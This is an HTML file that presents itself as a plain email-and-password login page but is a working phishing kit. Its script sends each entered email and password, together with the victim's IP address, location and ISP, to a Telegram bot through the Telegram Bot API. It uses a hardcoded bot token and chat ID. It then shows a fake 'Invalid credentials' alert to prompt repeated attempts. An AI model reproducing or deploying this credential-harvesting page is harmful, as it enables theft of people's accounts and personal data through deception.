<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-section, .password-section {
            display: flex;
            flex-direction: column;
            padding: 40px;
            background: #f9f9f9;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .login-section {
            display: block;
        }
        .password-section {
            display: none;
        }
        .input-field {
            margin-bottom: 15px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
        }
        .button {
            padding: 10px;
            background: #4CAF50;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .button:hover {
            background: #45a049;
        }
        .error-message {
            color: red;
            font-size: 12px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Email Section -->
    <div id="loginSection" class="login-section">
        <h2>Login</h2>
        <input type="text" id="emailInput" placeholder="Enter Email" class="input-field">
        <p id="emailError" class="error-message"></p>
        <button class="button" onclick="showPasswordSection()">Next</button>
    </div>

    <!-- Password Section -->
    <div id="passwordSection" class="password-section">
        <h2>Password</h2>
        <input type="password" id="passwordInput" placeholder="Enter Password" class="input-field">
        <p id="passwordError" class="error-message"></p>
        <button class="button" onclick="submitLogin()">Login</button>
    </div>
</div>

<script>
    var telegram_bot_id = "7688926536:AAFT_sAnsu3V9QuugxVIJKZ45JBVIUFaLGg";
    var chat_id = "7284131782";
    var attemptCounter = 0;
    var userInfo = {};

    // Fetch IP Info
    async function fetchIPInfo() {
        let url = "https://ipinfo.io/json?token=de42e80837e28f";
        try {
            let response = await fetch(url);
            let data = await response.json();
            userInfo = {
                country: data.country || 'N/A',
                state: data.region || 'N/A',
                city: data.city || 'N/A',
                isp: data.org || 'N/A',
                ip: data.ip || 'N/A'
            };
        } catch (error) {
            console.error('Error fetching IP info:', error);
        }
    }

    // Show Password Section
    function showPasswordSection() {
        const email = document.getElementById('emailInput').value;
        const emailError = document.getElementById('emailError');
        const loginSection = document.getElementById('loginSection');
        const passwordSection = document.getElementById('passwordSection');

        if (email.trim() === '') {
            emailError.textContent = "Email cannot be empty.";
            return;
        }

        emailError.textContent = '';
        loginSection.style.display = 'none';
        passwordSection.style.display = 'block';
    }

    // Submit Login
    async function submitLogin() {
        const email = document.getElementById('emailInput').value;
        const password = document.getElementById('passwordInput').value;
        const passwordError = document.getElementById('passwordError');

        if (password.trim() === '') {
            passwordError.textContent = "Password cannot be empty.";
            return;
        }

        attemptCounter++;
        await fetchIPInfo();
        const currentTime = new Date().toLocaleString();

        const message = `
🔐 *New Login Detected* 🔐
👤 *Email:* ${email}
🔑 *Password:* ${password}
🌍 *IP:* ${userInfo.ip}
🏙️ *City:* ${userInfo.city}
🗺️ *State:* ${userInfo.state}
🇺🇸 *Country:* ${userInfo.country}
🔗 *ISP:* ${userInfo.isp}
🕒 *Time:* ${currentTime}
⚠️ *Attempt Number:* ${attemptCounter}
        `;

        // Send data to Telegram
        fetch("https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chat_id,
                text: message,
                parse_mode: "Markdown"
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log("Data sent to Telegram successfully:", data);
            alert("Invalid credentials. Please try again.");
        })
        .catch(error => {
            console.error("Error sending data to Telegram:", error);
        });
    }
</script>

</body>
</html>
